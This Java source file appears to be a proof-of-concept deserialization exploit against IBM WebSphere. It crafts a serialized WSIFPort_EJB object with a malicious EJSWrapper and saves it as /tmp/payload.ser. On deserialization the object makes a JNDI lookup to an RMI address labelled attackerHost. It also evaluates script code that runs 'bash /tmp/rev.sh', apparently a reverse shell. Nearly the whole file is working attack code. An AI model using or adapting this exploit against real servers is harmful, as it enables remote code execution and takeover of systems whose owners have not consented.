import org.apache.wsif.providers.ejb.*;
import com.ibm.ws.ejbcontainer.jitdeploy.EJBWrapper;
import com.ibm.ejs.container.*;
import com.ibm.ejs.csi.*;
import com.ibm.websphere.csi.*;
import java.lang.reflect.*;
import com.ibm.ws.batch.*;
import java.rmi.*;
import javax.ejb.*;
import javax.wsdl.*;
import java.io.*;
import java.util.*;

public class Test {
    public static void main(String[] args) throws Exception {

        WSIFPort_EJB wsifPort_ejb = new WSIFPort_EJB(null,null,null);

        Field fieldEjbObject = wsifPort_ejb.getClass().getDeclaredField("fieldEjbObject");
        fieldEjbObject.setAccessible(true);
        fieldEjbObject.set(wsifPort_ejb,new EJSWrapperS());

        String outName="/tmp/payload.ser";
        try {
            FileOutputStream fileOut =
            new FileOutputStream(outName);
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(wsifPort_ejb);
            out.close();
            fileOut.close();
            System.out.printf("Serialized data is saved in "+outName);
        } catch (IOException i) {
            i.printStackTrace();
        }

    }

}
class EJSWrapperS extends EJSWrapper {
    @Override
    public Handle getHandle() throws RemoteException {
        Handle var2 = null;
        try {
            String attackerHost="127.0.0.1";
            SessionHome sessionHome = new SessionHome();
            J2EEName j2EEName = new J2EENameImpl("aa", "aa", "aa");
            Field j2eeName = EJSHome.class.getDeclaredField("j2eeName");
            j2eeName.setAccessible(true);
            j2eeName.set(sessionHome, j2EEName);
            Field jndiName = sessionHome.getClass().getSuperclass().getDeclaredField("jndiName");
            jndiName.setAccessible(true);
            jndiName.set(sessionHome, "rmi://"+attackerHost+":1099/poc");
            Serializable key = "\"a\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('bash /tmp/rev.sh')\")";
            BeanId beanId = new BeanId(sessionHome, key, true);
            BeanMetaData beanMetaData = new BeanMetaData(1);
            beanMetaData.homeInterfaceClass = com.ibm.ws.batch.CounterHome.class;
            Properties initProperties = new Properties();
            initProperties.setProperty("java.naming.factory.object", "org.apache.wsif.naming.WSIFServiceObjectFactory");
            Constructor c = EntityHandle.class.getDeclaredConstructor(BeanId.class, BeanMetaData.class, Properties.class);
            c.setAccessible(true);
            var2 = (Handle) c.newInstance(beanId, beanMetaData, initProperties);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return var2;
    }
}